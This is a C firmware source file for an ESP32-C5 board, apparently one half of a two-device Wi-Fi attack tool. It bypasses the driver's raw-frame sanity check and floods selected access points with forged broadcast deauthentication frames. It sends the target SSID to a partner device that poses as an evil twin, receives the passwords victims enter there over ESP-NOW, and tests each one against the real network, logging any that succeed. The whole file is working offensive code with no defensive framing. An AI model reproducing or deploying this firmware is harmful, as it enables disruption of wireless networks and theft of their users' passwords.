// main.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <inttypes.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "esp_system.h"
#include "esp_log.h"
#include "esp_err.h"

#include "nvs_flash.h"
#include "esp_netif.h"
#include "esp_wifi.h"
#include "esp_event.h"

#include "esp_now.h"
#include "esp_mac.h"

#include "esp_console.h"
#include "argtable3/argtable3.h"

#include "driver/uart.h"

#include "driver/gpio.h"

#include "led_strip.h"

#define NEOPIXEL_GPIO      27
#define LED_COUNT          1
#define RMT_RES_HZ         (10 * 1000 * 1000)  // 10 MHz



static const char *TAG = "projectZero";

//Target (ESP32) MAC of the other device (ESP32):
uint8_t esp32_mac[] = {0x28, 0x37, 0x2F, 0x5F, 0xC3, 0x18};


/**
 * @brief Deauthentication frame template
 */
uint8_t deauth_frame_default[] = {
    0xC0, 0x00,                         // Type/Subtype: Deauthentication (0xC0)
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast MAC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Sender (BSSID AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID AP
    0x00, 0x00,                         // Seq Control
    0x01, 0x00                          // Reason: Unspecified (0x0001)
};

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
    ESP_LOG_BUFFER_HEXDUMP(TAG, frame_buffer, size, ESP_LOG_DEBUG);
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
}


enum ApplicationState {
    DEAUTH,
    DEAUTH_EVIL_TWIN,
    EVIL_TWIN_PASS_CHECK,
    IDLE,
    DRAGON_DRAIN,
    SAE_OVERFLOW
};

volatile enum ApplicationState applicationState = IDLE;

#define MAX_AP_CNT 64
static wifi_ap_record_t g_scan_results[MAX_AP_CNT];
static uint16_t g_scan_count = 0;

static int g_selected_indices[MAX_AP_CNT];
static int g_selected_count = 0;

char * evilTwinSSID = NULL;
char * evilTwinPassword = NULL;
int connectAttemptCount = 0;
led_strip_handle_t strip;


// Methods forward declarations
static int cmd_scan_networks(int argc, char **argv);
static int cmd_select_networks(int argc, char **argv);
static int cmd_start_evil_twin(int argc, char **argv);
static int cmd_reboot(int argc, char **argv);
static esp_err_t do_scan_and_store(void);
static void print_scan_results(void);
static void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count);


static void wifi_event_handler(void *event_handler_arg,
                               esp_event_base_t event_base,
                               int32_t event_id,
                               void *event_data);

static void espnow_recv_cb(const esp_now_recv_info_t *recv_info, const uint8_t *data, int len);
static void espnow_send_cb(const esp_now_send_info_t *send_info, esp_now_send_status_t status);

static esp_err_t wifi_init_ap_sta(void);
static esp_err_t espnow_init(void);
static void register_commands(void);

// --- Wi-Fi event handler ---
static void wifi_event_handler(void *event_handler_arg,
                               esp_event_base_t event_base,
                               int32_t event_id,
                               void *event_data) {
    if (event_base == WIFI_EVENT) {
        switch (event_id) {
        case WIFI_EVENT_STA_CONNECTED: {
            const wifi_event_sta_connected_t *e = (const wifi_event_sta_connected_t *)event_data;
            ESP_LOGD(TAG, "Wi-Fi: connected to SSID='%s', channel=%d, bssid=%02X:%02X:%02X:%02X:%02X:%02X",
                     (const char*)e->ssid, e->channel,
                     e->bssid[0], e->bssid[1], e->bssid[2], e->bssid[3], e->bssid[4], e->bssid[5]);
            ESP_LOGI(TAG, "Wi-Fi: connected to SSID='%s' with password='%s'", evilTwinSSID, evilTwinPassword);
            applicationState = IDLE;
            break;
        }
        case WIFI_EVENT_SCAN_DONE: {
            const wifi_event_sta_scan_done_t *e = (const wifi_event_sta_scan_done_t *)event_data;
            ESP_LOGI(TAG, "Wi-Fi: finnished scan. Detected APs=%u, status=%u", e->number, e->status);
            applicationState = IDLE;
            break;
        }
        case WIFI_EVENT_STA_DISCONNECTED: {
            const wifi_event_sta_disconnected_t *e = (const wifi_event_sta_disconnected_t *)event_data;
            ESP_LOGW(TAG, "Wi-Fi: connection to AP failed. SSID='%s', reason=%d",
                     (const char*)e->ssid, (int)e->reason);
            if (applicationState == EVIL_TWIN_PASS_CHECK) {
                ESP_LOGW(TAG, "Evil twin: connection failed, wrong password? Btw connectAttemptCount: %d", connectAttemptCount);
                if (connectAttemptCount >= 3) {
                    ESP_LOGW(TAG, "Evil twin: Too many failed attempts, giving up and going to DEAUTH_EVIL_TWIN. Btw connectAttemptCount: %d ", connectAttemptCount);
                    applicationState = DEAUTH_EVIL_TWIN; //go back to deauth
                } else {
                    ESP_LOGW(TAG, "Evil twin: This is just a disconnect, connectAttemptCount: %d, will try again", connectAttemptCount);
                    connectAttemptCount++;
                    esp_wifi_connect();
                }
            } else {
                ESP_LOGW(TAG, "Set app state to IDLE");
                applicationState = IDLE;
            }
            break;
        }
        default:
            break;
        }
    }
}

// --- ESP-NOW callbacks ---
static void espnow_recv_cb(const esp_now_recv_info_t *recv_info, const uint8_t *data, int len) {
    char msg[len + 1];
    memcpy(msg, data, len);
    msg[len] = '\0';

    evilTwinPassword = malloc(len + 1);
    if (evilTwinPassword != NULL) {
        strcpy(evilTwinPassword, msg);
    } else {
        ESP_LOGW(TAG,"Malloc error 4 password");
    }

    ESP_LOGI(TAG, "Received from: %02X:%02X:%02X:%02X:%02X:%02X",
             recv_info->src_addr[0], recv_info->src_addr[1], recv_info->src_addr[2],
             recv_info->src_addr[3], recv_info->src_addr[4], recv_info->src_addr[5]);
    ESP_LOGI(TAG, "Message: %s", msg);

    //Now, let's check if it's a password for Evil Twin:
    applicationState = EVIL_TWIN_PASS_CHECK;

    //set up STA properties and try to connect to a network:
    wifi_config_t sta_config = { 0 };  
    strncpy((char *)sta_config.sta.ssid, evilTwinSSID, sizeof(sta_config.sta.ssid));
    sta_config.sta.ssid[sizeof(sta_config.sta.ssid) - 1] = '\0'; // null-terminate
    strncpy((char *)sta_config.sta.password, msg, sizeof(sta_config.sta.password));
    sta_config.sta.password[sizeof(sta_config.sta.password) - 1] = '\0'; // null-terminate
    esp_wifi_set_config(WIFI_IF_STA, &sta_config);
    vTaskDelay(pdMS_TO_TICKS(2000));
    ESP_LOGI(TAG, "Received connect command from ESP32 to SSID='%s' with password='%s'", evilTwinSSID, msg);
    connectAttemptCount = 0;
    ESP_LOGI(TAG, "Attempting to connect, connectAttemptCount=%d", connectAttemptCount);
    esp_wifi_connect();

    //this would be blocking!
    // while (connectAttemptCount<10) {
    //     if (applicationState == EVIL_TWIN_PASS_CHECK) {
    //         ESP_LOGW(TAG, "Evil twin: connect attempt number %d", connectAttemptCount);
    //         esp_wifi_connect();
    //         vTaskDelay(pdMS_TO_TICKS(1000));
    //         connectAttemptCount++;
    //     } else {
    //         ESP_LOGW(TAG, "Evil twin: connect attempt number %d but state is already %d", connectAttemptCount, applicationState);
    //     }
    // }
}

static void espnow_send_cb(const esp_now_send_info_t *send_info, esp_now_send_status_t status) {
    const uint8_t *mac_addr = send_info->des_addr;
    ESP_LOGI(TAG, "Sent to %02X:%02X:%02X:%02X:%02X:%02X, status: %s",
             mac_addr[0], mac_addr[1], mac_addr[2],
             mac_addr[3], mac_addr[4], mac_addr[5],
             status == ESP_NOW_SEND_SUCCESS ? "OK" : "ERROR");
}

// --- Inicjalizacja Wi-Fi (STA, no connection yet) ---
static esp_err_t wifi_init_ap_sta(void) {
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    esp_netif_create_default_wifi_ap();
    esp_netif_create_default_wifi_sta();
    

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT,
                                                        ESP_EVENT_ANY_ID,
                                                        &wifi_event_handler,
                                                        NULL,
                                                        NULL));

    wifi_config_t wifi_config = { 0 };
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_config));

    wifi_config_t mgmt_wifi_config = {
            .ap = {
                .ssid = "--",
                .ssid_len = 2,
                .password = "nevermind",
                .max_connection = 0,
                .authmode = WIFI_AUTH_WPA2_PSK
            },
        };

    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &mgmt_wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    uint8_t mac[6];
    esp_err_t ret = esp_wifi_get_mac(WIFI_IF_STA, mac);

    if (ret == ESP_OK) {
        ESP_LOGI("MAC", "MAC Address: %02X:%02X:%02X:%02X:%02X:%02X",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    } else {
        ESP_LOGE("MAC", "Failed to get MAC address");
    }

    return ESP_OK;
}

// --- Initialize ESP-NOW ---
static esp_err_t espnow_init(void) {
    
    ESP_ERROR_CHECK(esp_now_init());
    ESP_ERROR_CHECK(esp_now_register_recv_cb(espnow_recv_cb));
    ESP_ERROR_CHECK(esp_now_register_send_cb(espnow_send_cb));


    esp_now_peer_info_t peer = {
        .peer_addr = {0},
        .channel = 1,
        .encrypt = false,
    };
    memcpy(peer.peer_addr, esp32_mac, 6);
    if (esp_now_add_peer(&peer) != ESP_OK) {
        ESP_LOGE(TAG, "Failed to add peer");
    }
    return ESP_OK;
    ESP_LOGI(TAG, "Peer added");
}

// --- Auxiliary: scan and print ---
static esp_err_t do_scan_and_store(void) {
    wifi_scan_config_t scan_cfg = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = true,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time.active.min = 100,
        .scan_time.active.max = 300,
    };
    ESP_LOGI(TAG, "About to start scan...");
    ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_cfg, true)); // blokujace

    g_scan_count = MAX_AP_CNT;
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&g_scan_count, g_scan_results));

    uint16_t total = 0;
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&total));
    ESP_LOGI(TAG, "Found %u APs.", g_scan_count);

    return ESP_OK;
}

static void print_scan_results(void) {
    ESP_LOGI(TAG,"Index  RSSI  Auth  Channel  BSSID              SSID");
    for (int i = 0; i < g_scan_count; ++i) {
        wifi_ap_record_t *ap = &g_scan_results[i];
        ESP_LOGI(TAG,"%5d  %4d  %4d  %5d  %02X:%02X:%02X:%02X:%02X:%02X  %s",
               i, ap->rssi, ap->authmode, ap->primary,
               ap->bssid[0], ap->bssid[1], ap->bssid[2],
               ap->bssid[3], ap->bssid[4], ap->bssid[5],
               (const char*)ap->ssid);
    }
}

// --- CLI: commands ---
static int cmd_scan_networks(int argc, char **argv) {
    (void)argc; (void)argv;
    esp_err_t err = do_scan_and_store();
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Scan failed: %s", esp_err_to_name(err));
        return 1;
    }
    print_scan_results();
    return 0;
}

static int cmd_select_networks(int argc, char **argv) {
    if (argc < 2) {
        ESP_LOGW(TAG,"Syntax: select_networks <index1> [index2] ...");
        return 1;
    }
    g_selected_count = 0;
    for (int i = 1; i < argc && g_selected_count < MAX_AP_CNT; ++i) {
        int idx = atoi(argv[i]);
        if (idx < 0 || idx >= (int)g_scan_count) {
            ESP_LOGW(TAG,"Fuck it, index %d (out of bounds 0..%u)", idx, g_scan_count ? (g_scan_count - 1) : 0);
            continue;
        }
        g_selected_indices[g_selected_count++] = idx;
    }
    if (g_selected_count == 0) {
        ESP_LOGW(TAG,"Man, first scan_networks.");
        return 1;
    }

    char buf[200];
    int len = snprintf(buf, sizeof(buf), "Selected: ");

    for (int i = 0; i < g_selected_count; ++i) {
        const char *selectedSSID = (const char *)g_scan_results[g_selected_indices[i]].ssid;
        len += snprintf(buf + len, sizeof(buf) - len, "%s%s", selectedSSID, (i + 1 == g_selected_count) ? "" : ",");
    }

    ESP_LOGI(TAG, "%s", buf);


    return 0;
}


/*
0) Sends the first network name over ESP-NOW to ESP32
1) Starts a stream of deauth pockets sent to all target networks. 
2) Listens for password to try over ESP-NOW
3) When password arrives, stops deauth stream and attempts to connect to a network

*/
static int cmd_start_evil_twin(int argc, char **argv) {
    //avoid compiler warnings:
    (void)argc; (void)argv;

    if (g_selected_count > 0) {

        applicationState = DEAUTH_EVIL_TWIN;

        const char *sourceSSID = (const char *)g_scan_results[g_selected_indices[0]].ssid;
        evilTwinSSID = malloc(strlen(sourceSSID) + 1); 
        if (evilTwinSSID != NULL) {
            strcpy(evilTwinSSID, sourceSSID);
        } else {
            ESP_LOGW(TAG,"Malloc error 4 SSID");
        }

        //send evil ssid to ESP32 via ESP-NOW
        char msg[100];
        sprintf(msg, "#()^7841%%_%s", evilTwinSSID);
        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(100));
        ESP_ERROR_CHECK(esp_now_send(esp32_mac, (uint8_t *)msg, strlen(msg)));

        ESP_LOGI(TAG,"Evil twin: %s", evilTwinSSID);
        for (int i = 0; i < g_selected_count; ++i) {
            int idx = g_selected_indices[i];
            wifi_ap_record_t *ap = &g_scan_results[idx];
            ESP_LOGI(TAG,"  [%d] SSID='%s' RSSI=%d Auth=%d", idx, (const char*)ap->ssid, ap->rssi, ap->authmode);
        }
        //Main loop of deauth frames sending:
        while ((applicationState == DEAUTH) || (applicationState == DEAUTH_EVIL_TWIN) || (applicationState == EVIL_TWIN_PASS_CHECK)) {
            if (applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN) {
                ESP_LOGD(TAG,"Evil twin: sending deauth frames to %d selected APs...", g_selected_count);        
                ESP_ERROR_CHECK(led_strip_set_pixel(strip, 0, 0, 0, 255));
                ESP_ERROR_CHECK(led_strip_refresh(strip));
                wsl_bypasser_send_deauth_frame_multiple_aps(g_scan_results, g_selected_count);
                ESP_ERROR_CHECK(led_strip_clear(strip));
                ESP_ERROR_CHECK(led_strip_refresh(strip));
            }
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        ESP_LOGI(TAG,"Evil twin: finished attack. Reboot your board.");
    } else {
        ESP_LOGI(TAG,"Evl twin: no selected APs (use select_networks).");
    }
    return 0;
}

static int cmd_reboot(int argc, char **argv)
{
    (void)argc; (void)argv;
    ESP_LOGI(TAG,"Restart...");
    vTaskDelay(pdMS_TO_TICKS(100));
    esp_restart();
    return 0;
}

// --- Rejestracja komend w esp_console ---
static void register_commands(void)
{
    const esp_console_cmd_t scan_cmd = {
        .command = "scan_networks",
        .help = "Scans networks and prints results",
        .hint = NULL,
        .func = &cmd_scan_networks,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&scan_cmd));
    //ESP_LOGI(TAG, "Zarejestrowano komende: %s", scan_cmd.command);

    const esp_console_cmd_t select_cmd = {
        .command = "select_networks",
        .help = "Selects networks by indexes: select_networks 0 2 5",
        .hint = NULL,
        .func = &cmd_select_networks,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&select_cmd));

    const esp_console_cmd_t start_cmd = {
        .command = "start_evil_twin",
        .help = "Starts Evil Twin attack.",
        .hint = NULL,
        .func = &cmd_start_evil_twin,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&start_cmd));

    const esp_console_cmd_t reboot_cmd = {
        .command = "reboot",
        .help = "Device reboot to start from scratch",
        .hint = NULL,
        .func = &cmd_reboot,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&reboot_cmd));
}

void app_main(void) {

    esp_log_level_set("wifi", ESP_LOG_INFO);
    esp_log_level_set("projectZero", ESP_LOG_INFO);
    esp_log_level_set("espnow", ESP_LOG_INFO);

    // esp_log_level_set("wifi", ESP_LOG_DEBUG);
    // esp_log_level_set(TAG, ESP_LOG_DEBUG);
    // esp_log_level_set("espnow", ESP_LOG_DEBUG);


    ESP_LOGI(TAG, "Application starts (ESP32-C5)");

    // 1. LED strip configuration
    led_strip_config_t strip_cfg = {
        .strip_gpio_num            = NEOPIXEL_GPIO,
        .max_leds                  = LED_COUNT,
        .led_model                 = LED_MODEL_WS2812,
        .color_component_format = LED_STRIP_COLOR_COMPONENT_FMT_GRB,
        .flags.invert_out          = false,
    };

    // 2. LED Strip RMT configuration
    led_strip_rmt_config_t rmt_cfg = {
        .clk_src        = RMT_CLK_SRC_DEFAULT,
        .resolution_hz  = RMT_RES_HZ,
        .flags.with_dma = false,
    };

    // 3. strip instance
    ESP_ERROR_CHECK(led_strip_new_rmt_device(&strip_cfg, &rmt_cfg, &strip));



    ESP_ERROR_CHECK(nvs_flash_init());

    ESP_ERROR_CHECK(wifi_init_ap_sta());
    ESP_ERROR_CHECK(espnow_init()); 

    wifi_country_t wifi_country = {
        .cc = "PH",
        .schan = 1,
        .nchan = 14,
        .policy = WIFI_COUNTRY_POLICY_AUTO,
    };
    esp_err_t retC = esp_wifi_set_country(&wifi_country);
    if (retC != ESP_OK) {
           ESP_LOGE(TAG, "Failed to set Wi-Fi country code: %s", esp_err_to_name(retC));
    } else {
           ESP_LOGW(TAG, "Wi-Fi country code set to %s", wifi_country.cc);
    }


    esp_console_repl_t *repl = NULL;
    esp_console_repl_config_t repl_config = ESP_CONSOLE_REPL_CONFIG_DEFAULT();
    
    ESP_LOGI(TAG,"Available commands:");
    ESP_LOGI(TAG,"  scan_networks");
    ESP_LOGI(TAG,"  select_networks <indeks1> [indeks2] ...");
    ESP_LOGI(TAG,"  start_evil_twin");
    ESP_LOGI(TAG,"  reboot");

    repl_config.prompt = ">";
    repl_config.max_cmdline_length = 100;

    esp_console_register_help_command();
    register_commands();

    esp_console_dev_uart_config_t hw_config = ESP_CONSOLE_DEV_UART_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_console_new_repl_uart(&hw_config, &repl_config, &repl));

    ESP_ERROR_CHECK(esp_console_start_repl(repl));
}

void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count) {   
    if (applicationState == EVIL_TWIN_PASS_CHECK ) {
        ESP_LOGW(TAG, "Deauth stop requested in Evil Twin flow, checking for password, will do nothing here..");
        return;
    }

    //first, spend some time waiting for ESP-NOW signal that password has been provided which is expected on channel 1:
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    ESP_LOGI(TAG, "Waiting for ESP-NOW signal on channel 1 before deauth...");
    vTaskDelay(pdMS_TO_TICKS(300));
    ESP_LOGI(TAG, "Finished waiting for ESP-NOW...");
    //then, proceed with deauth frames on channels of the APs:
    for (int i = 0; i < g_selected_count; ++i) {

            if (applicationState == EVIL_TWIN_PASS_CHECK ) {
                ESP_LOGW(TAG, "Deauth stop requested in Evil Twin flow, checking for password, will do nothing here, exiting the loop...");
                return;
            }

            int idx = g_selected_indices[i];
            wifi_ap_record_t *ap_record = &g_scan_results[idx];
            ESP_LOGD(TAG, "Preparations to send deauth frame...");
            ESP_LOGI(TAG, "Target SSID: %s", ap_record->ssid);
            ESP_LOGI(TAG, "Target CHANNEL: %d", ap_record->primary);
            ESP_LOGD(TAG, "Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
                    ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
                    ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
            esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE );
            uint8_t deauth_frame[sizeof(deauth_frame_default)];
            memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
            memcpy(&deauth_frame[10], ap_record->bssid, 6);
            memcpy(&deauth_frame[16], ap_record->bssid, 6);
            wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
    }

}
